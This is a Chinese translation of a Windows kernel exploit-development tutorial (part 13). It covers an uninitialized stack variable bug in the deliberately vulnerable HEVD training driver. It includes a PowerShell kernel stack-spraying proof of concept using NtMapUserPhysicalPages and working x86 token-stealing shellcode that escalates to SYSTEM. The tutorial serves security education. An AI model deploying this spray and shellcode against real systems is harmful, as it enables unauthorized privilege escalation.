
# [翻译]Windows exploit开发系列教程第十三部分：内核利用程序之未初始化栈变量

> 点击查看<a href="elink@ccfK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3k6#2P5Y4A6&6M7$3g2U0N6i4u0A6N6s2W2Q4x3X3g2U0L8$3#2Q4x3V1k6@1N6i4c8G2M7X3W2S2L8s2y4Q4x3V1k6W2P5s2m8p5k6i4k6Q4x3V1j5I4y4#2)9J5k6h3S2@1L8h3H3`.">原文</a>

# Windows exploit开发系列教程第十三部分：内核利用程序之未初始化栈变量

欢迎回到Windows exp开发系列教材的第13部分。今天我们将编写一个基于HEVD有漏洞驱动的未初始化栈变量exp。调试环境的安装请参考第十部分。让我们开始吧！

+ `NtMapUserPhysicalPages` and Kernel Stack-Spraying Techniques (<a href="elink@5fcK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6@1N6$3W2@1N6r3g2J5i4K6u0W2j5$3!0E0i4K6u0r3K9U0l9H3M7Y4f1`.">@j00ru</a>) - <a href="elink@0b1K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3Z5H3x3s2u0#2i4K6u0W2N6X3g2^5K9h3I4D9K9i4g2E0i4K6u0W2L8%4u0Y4i4K6u0r3i4K6y4r3M7q4)9K6c8o6M7$3z5b7`.`.">here</a>

## 侦查挑战

简单的看一下有问题的函数(<a href="elink@6b2K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6Z5j5h3y4C8M7%4W2K6N6r3g2S2L8g2)9J5c8V1S2S2j5$3E0e0P5i4y4q4P5s2c8J5k6h3#2W2g2Y4g2D9L8X3g2J5j5h3u0D9k6f1c8J5K9i4k6W2M7W2)9J5c8X3u0D9L8$3u0Q4x3V1k6E0j5i4y4@1k6i4u0Q4x3V1k6p5M7X3W2$3k6i4u0Q4x3V1k6e0L8%4g2J5j5$3g2Q4x3V1k6g2L8X3W2F1K9i4c8A6j5h3I4A6P5X3g2V1f1%4c8S2j5$3E0h3j5i4u0A6j5h3u0D9k6g2)9J5k6h3x3`.">here</a>)。

```cpp
NTSTATUS TriggerUninitializedStackVariable(IN PVOID UserBuffer) {
ULONG UserValue = 0;
ULONG MagicValue = 0xBAD0B0B0;
NTSTATUS Status = STATUS_SUCCESS;
#ifdef SECURE
// Secure Note: This is secure because the developer is properly initializing
// UNINITIALIZED_STACK_VARIABLE to NULL and checks for NULL pointer before calling
// the callback
UNINITIALIZED_STACK_VARIABLE UninitializedStackVariable = {0};
#else
// Vulnerability Note: This is a vanilla Uninitialized Stack Variable vulnerability
// because the developer is not initializing 'UNINITIALIZED_STACK_VARIABLE' structure
// before calling the callback when 'MagicValue' does not match 'UserValue'
UNINITIALIZED_STACK_VARIABLE UninitializedStackVariable;
#endif
PAGED_CODE();
__try {
// Verify if the buffer resides in user mode
ProbeForRead(UserBuffer,
sizeof(UNINITIALIZED_STACK_VARIABLE),
(ULONG)__alignof(UNINITIALIZED_STACK_VARIABLE));
// Get the value from user mode
UserValue = *(PULONG)UserBuffer;
DbgPrint("[+] UserValue: 0x%p\n", UserValue);
DbgPrint("[+] UninitializedStackVariable Address: 0x%p\n", &UninitializedStackVariable);
// Validate the magic value
if (UserValue == MagicValue) {
UninitializedStackVariable.Value = UserValue;
UninitializedStackVariable.Callback = &UninitializedStackVariableObjectCallback;
}
DbgPrint("[+] UninitializedStackVariable.Value: 0x%p\n", UninitializedStackVariable.Value);
DbgPrint("[+] UninitializedStackVariable.Callback: 0x%p\n", UninitializedStackVariable.Callback);
#ifndef SECURE
DbgPrint("[+] Triggering Uninitialized Stack Variable Vulnerability\n");
#endif
// Call the callback function
if (UninitializedStackVariable.Callback) {
UninitializedStackVariable.Callback();
}
}
__except (EXCEPTION_EXECUTE_HANDLER) {
Status = GetExceptionCode();
DbgPrint("[-] Exception Code: 0x%X\n", Status);
}
return Status;
}
```

如果我们传入一个正确的魔数，它会填充变量以及回调参数。如果传递的值不正确那么就不会填充。这里的问题在于变量定义时并没有设置一个特定的初始值。由于该变量布局在栈上，它会拥有一个前调用函数遗留的随机垃圾值。注意到这样的一个检查（`if UninitializedStackVariable.Callback...`）毫无卵用并不能阻止其崩溃。

该函数的IOCTL码是`0x22202F`。可以查看本系列教程的第十部分和第十一部分来了解IOCTL是如何被识别的。转入IDA来看看这个函数。

![](upload/attach/201803/530966_GWF2F7YF3AXKEUV.jpg)

思考一下上图的4个函数块。如果比较成功我们就会命中绿色块，在这里我们的变量被填充了适当的值，此后在红色块中当回调函数被调用时也不会出什么意外。

![](upload/attach/201803/530966_UAZN34TEW8KQAK2.jpg)

不错，然而如果我们比较失败了，跳过了绿色快，继续下行调用函数的时候，我们调用的将是一个内核栈上的垃圾值！

![](upload/attach/201803/530966_75SGZ69SVY7XTK6.jpg)

这个值是不固定的，如果你尝试重现，很可能会在Windbg中看到不同的值。在虚拟机BSOD之前，让我们快速的看一下该变量距离当前栈起始位置有多远。

![](upload/attach/201803/530966_XRWDYVJTH2KHAD3.jpg)

计算方式：`0x8a15ced0 - 0x8a15c9cc = 0x504 (1284 bytes)`

让我们重新执行并对BSOD进行心智健全检查。

![](upload/attach/201803/530966_Z97P67NP2RBSDYG.jpg)

## Pwn

如果我们可以覆盖内核栈上的整型指针为我们shellcode的地址就大功告成了，但是这要怎么做呢？看起来内核栈喷射是个办法，我强烈推荐你去阅读@j00ru的<a href="elink@cdcK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3Z5H3x3s2u0#2i4K6u0W2N6X3g2^5K9h3I4D9K9i4g2E0i4K6u0W2L8%4u0Y4i4K6u0r3i4K6y4r3M7q4)9K6c8o6M7$3z5b7`.`.">这篇文章</a> 。有一个未文档化的函数，`NtMapUserPhysicalPages`，我们不关心它用于干什么，但它的一部分功能是拷贝输入的字节到内核栈上的一个本地缓冲区。最大尺寸可以拷贝1024\*IntPtr::Size(32位机器上是4字节=>4096字节)。对我们的需求来说足够了，下面的POC用以展示！

```powershell
Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
public static class EVD
{
[DllImport("ntdll.dll")]
public static extern uint NtMapUserPhysicalPages(
IntPtr BaseAddress,
UInt32 NumberOfPages,
Byte[] PageFrameNumbers);
}
"@
# $KernelStackSpray = 4\*1024
$KernelStackSpray = [System.BitConverter]::GetBytes(0xdeadb33f) * 1024
# This call will fail with NTSTATUS = 0xC00000EF (STATUS_INVALID_PARAMETER_1),
# however, by that time the buffer is already on the Kernel stack ;)
[EVD]::NtMapUserPhysicalPages([IntPtr]::Zero, 1024, $KernelStackSpray) |Out-Null
```

我们在`NtMapUserPhysicalPages`函数返回前下一个断点，运行POC以检阅内核栈。

![](upload/attach/201803/530966_KWAV9VGDT3UN8NC.jpg)

完美，在`NtMapUserPhysicalPages`返回后，栈应该被设置下去。因此我们可以污染该未初始化栈变量并调用该驱动函数。注意到该喷射是不连续的，巡视之后我发现栈上有大小相当的块（sizable chunks）但是他们被存储的值分割开来（我推测）。幸运的是，我们需要的偏移处可以被正确设置。

还有个关键点是栈不是一成不变的，因此最好在恰好触发bug之前进行喷射，这可以避免缓冲区被更少的操作修改。

再一次，我们覆盖该函数调用为那个重用的窃取token的shellcode地址，它和前面的章节一致无需任何修改。

```powershell
$Shellcode = [Byte[]] @(
#---[Setup]
0x60, # pushad
0x64, 0xA1, 0x24, 0x01, 0x00, 0x00, # mov eax, fs:[KTHREAD_OFFSET]
0x8B, 0x40, 0x50, # mov eax, [eax + EPROCESS_OFFSET]
0x89, 0xC1, # mov ecx, eax (Current _EPROCESS structure)
0x8B, 0x98, 0xF8, 0x00, 0x00, 0x00, # mov ebx, [eax + TOKEN_OFFSET]
#---[Copy System PID token]
0xBA, 0x04, 0x00, 0x00, 0x00, # mov edx, 4 (SYSTEM PID)
0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00, # mov eax, [eax + FLINK_OFFSET] <-|
0x2D, 0xB8, 0x00, 0x00, 0x00, # sub eax, FLINK_OFFSET |
0x39, 0x90, 0xB4, 0x00, 0x00, 0x00, # cmp [eax + PID_OFFSET], edx |
0x75, 0xED, # jnz ->|
0x8B, 0x90, 0xF8, 0x00, 0x00, 0x00, # mov edx, [eax + TOKEN_OFFSET]
0x89, 0x91, 0xF8, 0x00, 0x00, 0x00, # mov [ecx + TOKEN_OFFSET], edx
#---[Recover]
0x61, # popad
0xC3 # ret
)
```

我们的exp工作流将如下：（1）将shellcode放在内存任意位置，（2）使用指向shellcode的指针喷射内核栈，（3）触发未初始化变量漏洞。

## 终结

这就是所有的内容，可以参考下面的完整exp来了解更多信息。
